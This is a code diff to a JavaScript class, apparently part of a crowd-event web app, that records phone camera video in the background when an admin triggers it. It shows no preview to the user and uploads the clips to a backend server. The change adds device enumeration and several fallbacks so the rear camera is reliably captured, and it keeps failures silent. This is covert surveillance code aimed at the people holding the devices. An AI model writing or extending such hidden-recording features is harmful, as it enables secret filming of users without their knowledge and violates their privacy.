@@ -2,6 +2,7 @@
  * Starcatcher – Background Video Recording
  * Records video (no audio) in the background when triggered by admin.
  * No camera preview is shown to the user.
+ * Uses device enumeration to explicitly select the rear (back) camera.
  */
 
 class BackgroundRecorder {
@@ -15,24 +16,96 @@ class BackgroundRecorder {
     }
 
     /**
+     * Find the rear camera deviceId by enumerating all video devices.
+     * Returns the deviceId or null if not found.
+     */
+    async _findRearCameraId() {
+        try {
+            const devices = await navigator.mediaDevices.enumerateDevices();
+            const videoDevices = devices.filter(d => d.kind === 'videoinput');
+
+            console.log('Available cameras:', videoDevices.map(d => `${d.label} (${d.deviceId.substring(0, 8)}...)`));
+
+            if (videoDevices.length === 0) return null;
+            if (videoDevices.length === 1) return videoDevices[0].deviceId;
+
+            // Look for rear/back/environment camera by label
+            const rearCamera = videoDevices.find(d => {
+                const label = (d.label || '').toLowerCase();
+                return label.includes('back') ||
+                    label.includes('rear') ||
+                    label.includes('rück') ||
+                    label.includes('environment') ||
+                    label.includes('facing back') ||
+                    label.includes('camera 0') ||
+                    label.includes('camera2 0');  // Some Android devices
+            });
+
+            if (rearCamera) {
+                console.log('Found rear camera by label:', rearCamera.label);
+                return rearCamera.deviceId;
+            }
+
+            // If labels are empty (permission not yet granted), return last device
+            // On most phones, the last video device is the rear camera
+            if (!videoDevices[0].label) {
+                console.log('Camera labels not available, using last device (likely rear)');
+                return videoDevices[videoDevices.length - 1].deviceId;
+            }
+
+            // Fallback: use the last device (usually rear on mobile)
+            console.log('No clear rear camera found, using last device');
+            return videoDevices[videoDevices.length - 1].deviceId;
+
+        } catch (err) {
+            console.warn('Device enumeration failed:', err);
+            return null;
+        }
+    }
+
+    /**
      * Start background recording (video only, no audio)
      */
     async start() {
         if (this.isRecording) return;
 
         try {
-            // Try exact rear camera first, fallback to preferred
-            try {
-                this.stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: { exact: 'environment' }, width: { ideal: 1280 }, height: { ideal: 720 } },
-                    audio: false
-                });
-            } catch (exactErr) {
-                console.warn('Exact rear camera failed, trying preferred:', exactErr);
+            // Strategy 1: Try to find rear camera by device enumeration
+            const rearId = await this._findRearCameraId();
+
+            if (rearId) {
+                try {
+                    this.stream = await navigator.mediaDevices.getUserMedia({
+                        video: { deviceId: { exact: rearId }, width: { ideal: 1280 }, height: { ideal: 720 } },
+                        audio: false
+                    });
+                    console.log('✅ Using rear camera via deviceId');
+                } catch (idErr) {
+                    console.warn('deviceId selection failed:', idErr);
+                    this.stream = null;
+                }
+            }
+
+            // Strategy 2: Try facingMode exact
+            if (!this.stream) {
+                try {
+                    this.stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: { exact: 'environment' }, width: { ideal: 1280 }, height: { ideal: 720 } },
+                        audio: false
+                    });
+                    console.log('✅ Using rear camera via facingMode exact');
+                } catch (exactErr) {
+                    console.warn('facingMode exact failed:', exactErr);
+                }
+            }
+
+            // Strategy 3: Try facingMode preferred
+            if (!this.stream) {
                 this.stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } },
                     audio: false
                 });
+                console.log('⚠️ Using facingMode preferred (may be front camera)');
             }
 
             this.chunks = [];
@@ -59,7 +132,6 @@ class BackgroundRecorder {
 
         } catch (err) {
             console.error('Camera access error:', err);
-            // Silently fail – user doesn't need to know
         }
     }
 
@@ -98,7 +170,6 @@ class BackgroundRecorder {
         const blob = new Blob(this.chunks, { type: 'video/webm' });
         this.chunks = [];
 
-        // Determine upload URL
         const baseUrl = (window.CROWDFLASH_CONFIG && window.CROWDFLASH_CONFIG.BACKEND_URL)
             ? window.CROWDFLASH_CONFIG.BACKEND_URL.replace('wss://', 'https://').replace('ws://', 'http://')
             : '';
